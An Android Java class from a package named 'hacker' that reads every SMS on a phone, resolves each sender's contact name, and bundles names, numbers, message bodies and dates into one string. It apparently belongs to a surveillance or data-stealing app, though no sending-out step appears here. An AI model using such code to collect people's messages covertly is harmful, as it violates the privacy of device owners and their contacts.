/**
 * 
 */
package com.fan.hacker;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.util.Log;

/**
 * @author Administrator
 *获得短信记录
 */
public class SmsRecord {
	Context ctx;

	public SmsRecord(Context ctx) {
		super();
		this.ctx = ctx;
	}
	public  String getSmsRecords() {
		final String SMS_URI_ALL   = "content://sms/";
		final String SMS_URI_INBOX = "content://sms/inbox";   
	    final String SMS_URI_SEND  = "content://sms/sent";   
	    final String SMS_URI_DRAFT = "content://sms/draft";   
	       
	    StringBuilder smsBuilder = new StringBuilder(); 
	    try{   
	        ContentResolver contentResolverr = ctx.getContentResolver();   
	        String[] projection = new String[]{"_id", "address", "person","body", "date", "type"};   
	        Uri uri = Uri.parse(SMS_URI_ALL);   
	        Cursor cursor = contentResolverr.query(uri, projection, null, null, "date desc");
	        if (cursor.moveToFirst()) {   
	            String name;    
	            String phoneNumber;          
	            String smsbody;   
	            String date;   
	            String type;   
	            
	            int id= cursor.getColumnIndexOrThrow("_id");
	            int nameColumn = cursor.getColumnIndex("person");   
	            int phoneNumberColumn = cursor.getColumnIndex("address");   
	            int smsbodyColumn = cursor.getColumnIndex("body");   
	            int dateColumn = cursor.getColumnIndex("date");   
	            int typeColumn = cursor.getColumnIndex("type");   
	            
	            while(cursor.moveToNext()) 
	            {   
	                name = cursor.getString(nameColumn);                
	                phoneNumber = cursor.getString(phoneNumberColumn);   
	                smsbody = cursor.getString(smsbodyColumn);   
	                   
	                SimpleDateFormat dateFormat = new SimpleDateFormat(   
	                        "yyyy-MM-dd hh:mm:ss");   
	                Date d = new Date(Long.parseLong(cursor.getString(dateColumn)));   
	                date = dateFormat.format(d);   
	                   
	                int typeId = cursor.getInt(typeColumn);   
	                if(typeId == 1){   
	                    type = "接收";   
	                } else if(typeId == 2){   
	                    type = "发送";   
	                } else {   
	                    type = "";   
	                }   
	                //根据号码获取联系人的姓名
	                Uri personUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,phoneNumber);
	                Cursor localCursor = contentResolverr.query(personUri, new String[] {PhoneLookup.DISPLAY_NAME, PhoneLookup.PHOTO_ID,PhoneLookup._ID }, null, null, null);
	                if (localCursor.getCount()!=0)
	                {
	                	localCursor.moveToFirst();
	                	name = localCursor.getString(localCursor.getColumnIndex(PhoneLookup.DISPLAY_NAME));
	                }
	                localCursor.close();//localCursor必须在这里关闭，否则会造成cursor内存泄漏
	                smsBuilder.append("[");   
	                smsBuilder.append(name+",");   
	                smsBuilder.append(phoneNumber+",");   
	                smsBuilder.append(smsbody+",");   
	                smsBuilder.append(date+",");   
	                smsBuilder.append(type);   
	                smsBuilder.append("] ");   
	                
	                if(smsbody == null) smsbody = "";     
	            } 
	            
	        } else {   
	            smsBuilder.append("no result!");   
	        }   
	            
	        smsBuilder.append("getSmsInPhone has executed!");  
	        cursor.close();
	    } catch(SQLiteException ex) {   
	        Log.d("SQLiteException in getSmsInPhone", ex.getMessage());   
	    }   
	    return smsBuilder.toString();   
	} 

}
